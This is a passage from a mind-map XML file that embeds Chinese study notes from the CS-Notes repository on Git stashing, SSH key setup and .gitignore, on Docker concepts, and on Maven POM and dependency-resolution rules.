</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 储藏（Stashing）" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Git.md#储藏stashing">
</a>
    <p dir="auto">
      在一个分支上操作之后，如果还没有将修改提交到分支上，此时进行切换分支，那么另一个分支上也能看到新的修改。这是因为所有分支都共用一个工作区的缘故。
    </p>
    <p dir="auto">
      可以使用 git stash 将当前分支的修改储藏起来，此时当前工作区的所有修改都会被存到栈中，也就是说当前工作区是干净的，没有任何未提交的修改。此时就可以安全的切换到其它分支上了。
    </p>
    <pre class="notranslate">$ git stash
Saved working directory and index state \ &quot;WIP on master: 049d078 added the index file&quot;
HEAD is now at 049d078 added the index file (To restore them type &quot;git stash apply&quot;)</pre>
    <p dir="auto">
      该功能可以用于 bug 分支的实现。如果当前正在 dev 分支上进行开发，但是此时 master 上有个 bug 需要修复，但是 dev 分支上的开发还未完成，不想立即提交。在新建 bug 分支并切换到 bug 分支之前就需要使用 git stash 将 dev 分支的未提交修改储藏起来。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_435893968" CREATED="1754750651221" MODIFIED="1754750651223"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      SSH 传输设置
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: SSH 传输设置" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Git.md#ssh-传输设置">
</a>
    <p dir="auto">
      Git 仓库和 Github 中心仓库之间的传输是通过 SSH 加密。
    </p>
    <p dir="auto">
      如果工作区下没有 .ssh 目录，或者该目录下没有 id_rsa 和 id_rsa.pub 这两个文件，可以通过以下命令来创建 SSH Key：
    </p>
    <pre class="notranslate">$ ssh-keygen -t rsa -C &quot;youremail@example.com&quot;</pre>
    <p dir="auto">
      然后把公钥 id_rsa.pub 的内容复制到 Github &quot;Account settings&quot; 的 SSH Keys 中。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1330340330" CREATED="1754750651223" MODIFIED="1754750651225"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      .gitignore 文件
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: .gitignore 文件" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Git.md#gitignore-文件">
</a>
    <p dir="auto">
      忽略以下文件：
    </p>
    <ul dir="auto">
      <li>
        操作系统自动生成的文件，比如缩略图；
      </li>
      <li>
        编译生成的中间文件，比如 Java 编译产生的 .class 文件；
      </li>
      <li>
        自己的敏感信息，比如存放口令的配置文件。
      </li>
    </ul>
    <p dir="auto">
      不需要全部自己编写，可以到 <a href="https://github.com/github/gitignore">https://github.com/github/gitignore</a>&#xa0;中进行查询。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1673985482" CREATED="1754750651225" MODIFIED="1754750651227"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Git 命令一览
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Git 命令一览" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Git.md#git-命令一览">
</a><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/de8a69d12ae1b8f675116bcb7257f90e277835c3054835d13964c8f02df7f440/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f37613239616363652d663234332d343931342d396630302d6632393838633532383431322e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/de8a69d12ae1b8f675116bcb7257f90e277835c3054835d13964c8f02df7f440/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f37613239616363652d663234332d343931342d396630302d6632393838633532383431322e6a7067" width="" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7a29acce-f243-4914-9f00-f2988c528412.jpg"/></a><br/>
    <p dir="auto">
      比较详细的地址：<a href="http://www.cheat-sheets.org/saved-copy/git-cheat-sheet.pdf" rel="nofollow">http://www.cheat-sheets.org/saved-copy/git-cheat-sheet.pdf</a>
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_9697727" CREATED="1754750651227" MODIFIED="1754750651229"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考资料
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参考资料" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Git.md#参考资料">
</a>
    <ul dir="auto">
      <li>
        <a href="http://rogerdudler.github.io/git-guide/index.zh.html" rel="nofollow">Git - 简明指南</a>
      </li>
      <li>
        <a href="http://marklodato.github.io/visual-git-guide/index-zh-cn.html" rel="nofollow">图解 Git</a>
      </li>
      <li>
        <a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000" rel="nofollow">廖雪峰 : Git 教程</a>
      </li>
      <li>
        <a href="https://learngitbranching.js.org/" rel="nofollow">Learn Git Branching</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_830081932" CREATED="1754749813733" MODIFIED="1754750698463" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Docker.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Docker
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_412921849" CREATED="1754750651230" MODIFIED="1754750651232"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      一、解决的问题
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 一、解决的问题" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Docker.md#一解决的问题">
</a>
    <p dir="auto">
      由于不同的机器有不同的操作系统，以及不同的库和组件，在将一个应用部署到多台机器上需要进行大量的环境配置操作。
    </p>
    <p dir="auto">
      Docker 主要解决环境配置问题，它是一种虚拟化技术，对进程进行隔离，被隔离的进程独立于宿主操作系统和其它隔离的进程。使用 Docker 可以不修改应用程序代码，不需要开发人员学习特定环境下的技术，就能够将现有的应用程序部署在其它机器上。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/88b742a4e55ba061e10210fbf5b0a1196416bc6e5b0a9028fc3e93baeec2ac91/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f30313166336566362d643832342d346434332d386232632d3336646162386561616137322d312e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/88b742a4e55ba061e10210fbf5b0a1196416bc6e5b0a9028fc3e93baeec2ac91/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f30313166336566362d643832342d346434332d386232632d3336646162386561616137322d312e706e67" width="400px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/011f3ef6-d824-4d43-8b2c-36dab8eaaa72-1.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_24664271" CREATED="1754750651232" MODIFIED="1754750651234"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二、与虚拟机的比较
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 二、与虚拟机的比较" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Docker.md#二与虚拟机的比较">
</a>
    <p dir="auto">
      虚拟机也是一种虚拟化技术，它与 Docker 最大的区别在于它是通过模拟硬件，并在硬件上安装操作系统来实现。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3f9cc938b38ea72aa2761824b0f61c77365553e3f7bf16acdb3b15c9827c8639/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f62653630386137372d376237662d346638652d383763632d6632323337323730626636392e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/3f9cc938b38ea72aa2761824b0f61c77365553e3f7bf16acdb3b15c9827c8639/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f62653630386137372d376237662d346638652d383763632d6632323337323730626636392e706e67" width="500" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/be608a77-7b7f-4f8e-87cc-f2237270bf69.png"/>
    </a><br/>
  </body>
</html></richcontent>
<node ID="ID_1102135865" CREATED="1754750651235" MODIFIED="1754750651236"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      启动速度
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 启动速度" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Docker.md#启动速度">
</a>
    <p dir="auto">
      启动虚拟机需要先启动虚拟机的操作系统，再启动应用，这个过程非常慢；
    </p>
    <p dir="auto">
      而启动 Docker 相当于启动宿主操作系统上的一个进程。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_221770422" CREATED="1754750651236" MODIFIED="1754750651238"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      占用资源
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 占用资源" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Docker.md#占用资源">
</a>
    <p dir="auto">
      虚拟机是一个完整的操作系统，需要占用大量的磁盘、内存和 CPU 资源，一台机器只能开启几十个的虚拟机。
    </p>
    <p dir="auto">
      而 Docker 只是一个进程，只需要将应用以及相关的组件打包，在运行时占用很少的资源，一台机器可以开启成千上万个 Docker。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_570770376" CREATED="1754750651238" MODIFIED="1754750651240"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      三、优势
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 三、优势" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Docker.md#三优势">
</a>
    <p dir="auto">
      除了启动速度快以及占用资源少之外，Docker 具有以下优势：
    </p>
  </body>
</html></richcontent>
<node ID="ID_1618217237" CREATED="1754750651241" MODIFIED="1754750651242"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      更容易迁移
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 更容易迁移" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Docker.md#更容易迁移">
</a>
    <p dir="auto">
      提供一致性的运行环境。已经打包好的应用可以在不同的机器上进行迁移，而不用担心环境变化导致无法运行。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_929960344" CREATED="1754750651243" MODIFIED="1754750651245"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      更容易维护
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 更容易维护" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Docker.md#更容易维护">
</a>
    <p dir="auto">
      使用分层技术和镜像，使得应用可以更容易复用重复的部分。复用程度越高，维护工作也越容易。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_964229285" CREATED="1754750651245" MODIFIED="1754750651246"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      更容易扩展
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 更容易扩展" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Docker.md#更容易扩展">
</a>
    <p dir="auto">
      可以使用基础镜像进一步扩展得到新的镜像，并且官方和开源社区提供了大量的镜像，通过扩展这些镜像可以非常容易得到我们想要的镜像。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1790876786" CREATED="1754750651247" MODIFIED="1754750651247"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      四、使用场景
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1392517927" CREATED="1754750651249" MODIFIED="1754750651249"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      持续集成
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 持续集成" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Docker.md#持续集成">
</a>
    <p dir="auto">
      持续集成指的是频繁地将代码集成到主干上，这样能够更快地发现错误。
    </p>
    <p dir="auto">
      Docker 具有轻量级以及隔离性的特点，在将代码集成到一个 Docker 中不会对其它 Docker 产生影响。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_229034342" CREATED="1754750651250" MODIFIED="1754750651251"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      提供可伸缩的云服务
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 提供可伸缩的云服务" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Docker.md#提供可伸缩的云服务">
</a>
    <p dir="auto">
      根据应用的负载情况，可以很容易地增加或者减少 Docker。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_402576658" CREATED="1754750651252" MODIFIED="1754750651253"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      搭建微服务架构
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 搭建微服务架构" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Docker.md#搭建微服务架构">
</a>
    <p dir="auto">
      Docker 轻量级的特点使得它很适合用于部署、维护、组合微服务。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_20155690" CREATED="1754750651254" MODIFIED="1754750651255"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      五、镜像与容器
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 五、镜像与容器" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Docker.md#五镜像与容器">
</a>
    <p dir="auto">
      镜像是一种静态的结构，可以看成面向对象里面的类，而容器是镜像的一个实例。
    </p>
    <p dir="auto">
      镜像包含着容器运行时所需要的代码以及其它组件，它是一种分层结构，每一层都是只读的（read-only layers）。构建镜像时，会一层一层构建，前一层是后一层的基础。镜像的这种分层存储结构很适合镜像的复用以及定制。
    </p>
    <p dir="auto">
      构建容器时，通过在镜像的基础上添加一个可写层（writable layer），用来保存着容器运行过程中的修改。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3f4e46f103f9509ce646fc77f57a47baf8cdd134f116fc4b4920a36297e5bf57/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f646f636b65722d66696c6573797374656d732d62757379626f7872772e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/3f4e46f103f9509ce646fc77f57a47baf8cdd134f116fc4b4920a36297e5bf57/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f646f636b65722d66696c6573797374656d732d62757379626f7872772e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/docker-filesystems-busyboxrw.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1963356825" CREATED="1754750651256" MODIFIED="1754750651257"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考资料
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参考资料" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Docker.md#参考资料">
</a>
    <ul dir="auto">
      <li>
        <a href="https://blog.docker.com/2017/08/docker-101-introduction-docker-webinar-recap/" rel="nofollow">DOCKER 101: INTRODUCTION TO DOCKER WEBINAR RECAP</a>
      </li>
      <li>
        <a href="http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html" rel="nofollow">Docker 入门教程</a>
      </li>
      <li>
        <a href="http://www.bogotobogo.com/DevOps/Docker/Docker_Container_vs_Virtual_Machine.php" rel="nofollow">Docker container vs Virtual machine</a>
      </li>
      <li>
        <a href="https://linoxide.com/linux-how-to/dockerfile-create-docker-container/" rel="nofollow">How to Create Docker Container using Dockerfile</a>
      </li>
      <li>
        <a href="http://www.cnblogs.com/sammyliu/p/5877964.html" rel="nofollow">理解 Docker（2）：Docker 镜像</a>
      </li>
      <li>
        <a href="https://yeasy.gitbooks.io/docker_practice/introduction/why.html" rel="nofollow">为什么要使用 Docker？</a>
      </li>
      <li>
        <a href="https://www.docker.com/what-docker" rel="nofollow">What is Docker</a>
      </li>
      <li>
        <a href="http://www.ruanyifeng.com/blog/2015/09/continuous-integration.html" rel="nofollow">持续集成是什么？</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_826254455" CREATED="1754749813736" MODIFIED="1754750703767" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      构建工具
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_415376241" CREATED="1754750651260" MODIFIED="1754750651261"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      一、构建工具的作用
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 一、构建工具的作用" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7.md#一构建工具的作用">
</a>
    <p dir="auto">
      构建一个项目通常包含了依赖管理、测试、编译、打包、发布等流程，构建工具可以自动化进行这些操作，从而为我们减少这些繁琐的工作。
    </p>
    <p dir="auto">
      其中构建工具提供的依赖管理能够可以自动处理依赖关系。例如一个项目需要用到依赖 A，A 又依赖于 B，那么构建工具就能帮我们导入 B，而不需要我们手动去寻找并导入。
    </p>
    <p dir="auto">
      在 Java 项目中，打包流程通常是将项目打包成 Jar 包。在没有构建工具的情况下，我们需要使用命令行工具或者 IDE 手动打包。而发布流程通常是将 Jar 包上传到服务器上。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1586744022" CREATED="1754750651262" MODIFIED="1754750651264"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二、Java 主流构建工具
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 二、Java 主流构建工具" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7.md#二java-主流构建工具">
</a>
    <p dir="auto">
      Ant 具有编译、测试和打包功能，其后出现的 Maven 在 Ant 的功能基础上又新增了依赖管理功能，而最新的 Gradle 又在 Maven 的功能基础上新增了对 Groovy 语言的支持。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5e09c7aa8c9ea1cb887caaa157284d77c5a025ce1be131f93c4abb18c88b11d1/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383230343131383933322e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/5e09c7aa8c9ea1cb887caaa157284d77c5a025ce1be131f93c4abb18c88b11d1/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383230343131383933322e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191208204118932.png"/>
    </a><br/>
    

    <p dir="auto">
      Gradle 和 Maven 的区别是，它使用 Groovy 这种特定领域语言（DSL）来管理构建脚本，而不再使用 XML 这种标记性语言。因为项目如果庞大的话，XML 很容易就变得臃肿。
    </p>
    <p dir="auto">
      例如要在项目中引入 Junit，Maven 的代码如下：
    </p>
    <pre>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
  xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
   &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
   &lt;groupId&gt;jizg.study.maven.hello&lt;/groupId&gt;
   &lt;artifactId&gt;hello-first&lt;/artifactId&gt;
   &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
   &lt;dependencies&gt;
          &lt;dependency&gt;
               &lt;groupId&gt;junit&lt;/groupId&gt;
               &lt;artifactId&gt;junit&lt;/artifactId&gt;
               &lt;version&gt;4.10&lt;/version&gt;
               &lt;scope&gt;test&lt;/scope&gt;
          &lt;/dependency&gt;
   &lt;/dependencies&gt;
&lt;/project&gt;</pre>
    <p dir="auto">
      而 Gradle 只需要几行代码：
    </p>
    <pre>dependencies {
    testCompile &quot;junit:junit:4.10&quot;
}</pre>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1288917944" CREATED="1754750651264" MODIFIED="1754750651264"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      三、Maven
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_237759752" CREATED="1754750651264" MODIFIED="1754750651266"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      概述
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 概述" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7.md#概述">
</a>
    <p dir="auto">
      提供了项目对象模型（POM）文件来管理项目的构建。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1455366181" CREATED="1754750651266" MODIFIED="1754750651268"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      仓库
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 仓库" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7.md#仓库">
</a>
    <p dir="auto">
      仓库的搜索顺序为：本地仓库、中央仓库、远程仓库。
    </p>
    <ul dir="auto">
      <li>
        本地仓库用来存储项目的依赖库；
      </li>
      <li>
        中央仓库是下载依赖库的默认位置；
      </li>
      <li>
        远程仓库，因为并非所有的依赖库都在中央仓库，或者中央仓库访问速度很慢，远程仓库是中央仓库的补充。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_351779189" CREATED="1754750651269" MODIFIED="1754750651270"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      POM
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: POM" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7.md#pom">
</a>
    <p dir="auto">
      POM 代表项目对象模型，它是一个 XML 文件，保存在项目根目录的 pom.xml 文件中。
    </p>
    <pre>&lt;dependency&gt;
    &lt;groupId&gt;junit&lt;/groupId&gt;
    &lt;artifactId&gt;junit&lt;/artifactId&gt;
    &lt;version&gt;4.12&lt;/version&gt;
    &lt;scope&gt;test&lt;/scope&gt;
&lt;/dependency&gt;</pre>
    <p dir="auto">
      [groupId, artifactId, version, packaging, classifier] 称为一个项目的坐标，其中 groupId、artifactId、version 必须定义，packaging 可选（默认为 Jar），classifier 不能直接定义的，需要结合插件使用。
    </p>
    <ul dir="auto">
      <li>
        groupId：项目组 Id，必须全球唯一；
      </li>
      <li>
        artifactId：项目 Id，即项目名；
      </li>
      <li>
        version：项目版本；
      </li>
      <li>
        packaging：项目打包方式。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_143845443" CREATED="1754750651271" MODIFIED="1754750651271"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      依赖原则
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_44998878" CREATED="1754750651272" MODIFIED="1754750651274"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 依赖路径最短优先原则
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 依赖路径最短优先原则" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7.md#1-依赖路径最短优先原则">
</a>
    <pre>A -&gt; B -&gt; C -&gt; X(1.0)
A -&gt; D -&gt; X(2.0)</pre>
    <p dir="auto">
      由于 X(2.0) 路径最短，所以使用 X(2.0)。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_194020509" CREATED="1754750651274" MODIFIED="1754750651275"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 声明顺序优先原则
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 声明顺序优先原则" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7.md#2-声明顺序优先原则">
</a>
    <pre>A -&gt; B -&gt; X(1.0)
A -&gt; C -&gt; X(2.0)</pre>
    <p dir="auto">
      在 POM 中最先声明的优先，上面的两个依赖如果先声明 B，那么最后使用 X(1.0)。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1849253196" CREATED="1754750651277" MODIFIED="1754750651278"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 覆写优先原则
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 覆写优先原则" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7.md#3-覆写优先原则">
</a>
    <p dir="auto">
      子 POM 内声明的依赖优先于父 POM 中声明的依赖。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1623520711" CREATED="1754750651279" MODIFIED="1754750651280"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      解决依赖冲突
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 解决依赖冲突" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7.md#解决依赖冲突">
</a>
    <p dir="auto">
      找到 Maven 加载的 Jar 包版本，使用 <code>mvn dependency:tree</code>&#xa0;查看依赖树，根据依赖原则来调整依赖在 POM 文件的声明顺序。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1200183506" CREATED="1754750651281" MODIFIED="1754751792677" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考资料
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_342579620" CREATED="1754751792650" MODIFIED="1754751792653" LINK="http://maven.apache.org/pom.html#Dependency_Version_Requirement_Specification"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <span rel="nofollow">POM Reference</span>
  </body>
</html>
</richcontent>
</node>
<node ID="ID_586233583" CREATED="1754751792660" MODIFIED="1754751792663" LINK="https://stackoverflow.com/questions/7249871/what-is-a-build-tool"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <span rel="nofollow">What is a build tool?</span>
  </body>
</html>
</richcontent>
</node>
<node ID="ID_831839535" CREATED="1754751792665" MODIFIED="1754751792668" LINK="https://programmingmitra.blogspot.com/2016/05/java-build-tools-comparisons-ant-vs.html"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
